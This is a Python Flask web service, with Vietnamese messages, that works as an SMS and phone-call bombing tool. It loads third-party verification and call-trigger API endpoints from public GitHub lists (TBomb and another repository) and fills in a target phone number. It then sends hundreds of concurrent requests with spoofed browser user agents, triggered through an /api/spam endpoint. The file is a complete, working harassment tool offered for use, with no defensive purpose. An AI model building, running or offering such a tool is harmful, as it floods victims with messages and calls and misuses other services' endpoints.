from flask import Flask, request, jsonify, send_from_directory
import threading
import aiohttp
import asyncio
import random
import time
import json
import urllib.request

app = Flask(__name__, static_folder='.')

API_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/apidata.json",
    "https://raw.githubusercontent.com/ghreg/SMS/master/api.json"
]

LOADED_APIS = []
CALL_APIS = []

def fetch_apis():
    global LOADED_APIS, CALL_APIS
    apis = []
    calls = []
    
    for source in API_SOURCES:
        try:
            req = urllib.request.Request(source, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req) as response:
                data = json.loads(response.read().decode())
                
                if isinstance(data, dict):
                    if 'sms' in data:
                        for country_apis in data['sms'].values():
                            for api in country_apis:
                                apis.append({
                                    "type": "SMS",
                                    "name": api.get('name', 'Unknown'),
                                    "url": api.get('url'),
                                    "method": api.get('method', 'POST'),
                                    "headers": api.get('headers', {}),
                                    "data": api.get('data', {})
                                })
                    
                    if 'call' in data:
                        for country_apis in data['call'].values():
                            for api in country_apis:
                                call_api = {
                                    "type": "CALL",
                                    "name": api.get('name', 'Unknown'),
                                    "url": api.get('url'),
                                    "method": api.get('method', 'POST'),
                                    "headers": api.get('headers', {}),
                                    "data": api.get('data', {})
                                }
                                apis.append(call_api)
                                calls.append(call_api)
                
                elif isinstance(data, list):
                    for api in data:
                        apis.append({
                            "type": "SMS/CALL",
                            "name": api.get('desc', 'Unknown'),
                            "url": api.get('url'),
                            "method": api.get('method', 'POST'),
                            "headers": api.get('header', {}),
                            "data": api.get('data', {})
                        })
        except Exception as e:
            print(f"[-] Lỗi tải API: {e}")
    
    LOADED_APIS = apis
    CALL_APIS = calls
    print(f"[+] Đã nạp {len(LOADED_APIS)} API (Trong đó có {len(CALL_APIS)} API Call).")

def prepare_payload(api_data, phone):
    payload = {}
    for key, value in api_data.items():
        if isinstance(value, str):
            new_val = value.replace('{target}', phone).replace('[phone]', phone).replace('[timestamp]', str(int(time.time())))
            payload[key] = new_val
        else:
            payload[key] = value
    return payload

async def send_req(session, sem, phone, api):
    async with sem:
        try:
            payload = prepare_payload(api['data'], phone)
            headers = api['headers'].copy()
            headers['User-Agent'] = random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15"
            ])
            
            if api['method'].upper() == 'GET':
                async with session.get(api['url'], params=payload, headers=headers, timeout=3) as res:
                    return {"status": res.status, "type": api['type']}
            else:
                async with session.post(api['url'], json=payload, headers=headers, timeout=3) as res:
                    return {"status": res.status, "type": api['type']}
        except Exception:
            return {"status": 500, "type": "ERROR"}

def run_spam(phone, amount):
    if not LOADED_APIS:
        print("[-] Không có API nào được nạp.")
        return

    print(f"[*] BẮT ĐẦU BẮN TỐC ĐỘ CAO: {amount} requests tới {phone}.")
    
    async def main():
        sem = asyncio.Semaphore(500) 
        connector = aiohttp.TCPConnector(limit=500, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(amount):
                if CALL_APIS and random.random() < 0.8:
                    api = random.choice(CALL_APIS)
                else:
                    api = random.choice(LOADED_APIS)
                tasks.append(send_req(session, sem, phone, api))
            
            results = await asyncio.gather(*tasks)
            
            sms_success = sum(1 for r in results if r["status"] == 200 and r["type"] == "SMS")
            call_success = sum(1 for r in results if r["status"] == 200 and r["type"] == "CALL")
            total_success = sum(1 for r in results if r["status"] == 200)
            
            print(f"[+] HOÀN TẤT! Tổng thành công: {total_success}/{amount}")
            print(f"    - SMS: {sms_success} | Call: {call_success}")
            
    asyncio.run(main())

@app.route('/')
def home():
    return send_from_directory('.', 'index.html')

@app.route('/api/spam', methods=['POST'])
def api_spam():
    data = request.json
    phone = data.get('phone')
    amount = int(data.get('amount', 0))
    
    if not phone or amount <= 0:
        return jsonify({"message": "Dữ liệu không hợp lệ"}), 400
    
    if not LOADED_APIS:
        fetch_apis()
    
    threading.Thread(target=run_spam, args=(phone, amount)).start()
    return jsonify({"message": f"Đã nhận lệnh! Đang bắn {amount} requests tới {phone}."})

if __name__ == '__main__':
    fetch_apis()
    app.run(host='0.0.0.0', port=5000)
